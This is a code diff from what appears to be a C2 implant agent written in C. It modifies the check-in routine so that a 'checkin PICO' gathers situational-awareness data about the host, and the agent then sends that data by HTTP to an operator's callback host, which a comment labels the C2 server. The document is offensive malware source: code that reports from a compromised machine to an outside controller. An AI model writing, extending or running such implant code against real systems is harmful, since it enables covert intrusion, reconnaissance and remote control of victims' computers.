@@ -35,13 +35,16 @@ void agent_exit(AgentState *state, AgentCapabilities *cap) {
 	KERNEL32$ExitProcess(0); // currently only ExitProcess() is supported TODO
 }
 
-void perform_checkin(AgentParams *params, HttpHandle *http, CheckinReply *reply) {
+void perform_checkin(AgentParams *params, AgentCapabilities *cap, HttpHandle *http, CheckinReply *reply) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
 	checkin.payload_uuid = clone_str(params->payload_uuid);
-	char *msg = generate_checkin_message(&checkin);
+	
+	// Use the checkin PICO to gather basic situational awareness info, if possible.
+	cap->CheckinPicoEntrypoint(&checkin);
 	
 	// Send checkin payload to C2 server.
+	char *msg = generate_checkin_message(&checkin);
 	HttpURI uri = {params->callback_host, params->callback_port, params->callback_uri};
 	HttpBody body = {msg, MSVCRT$strlen(msg)};
 	HttpResponse response = {0};
@@ -107,7 +110,7 @@ void go() {
 	state.http = HttpInit(state.params.callback_https);
 	
 	CheckinReply checkin_reply = { 0 };
-	perform_checkin(&state.params, state.http, &checkin_reply);
+	perform_checkin(&state.params, &capabilities, state.http, &checkin_reply);
 	
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
 		dprintf("Checkin failed with: %s", checkin_reply.status);
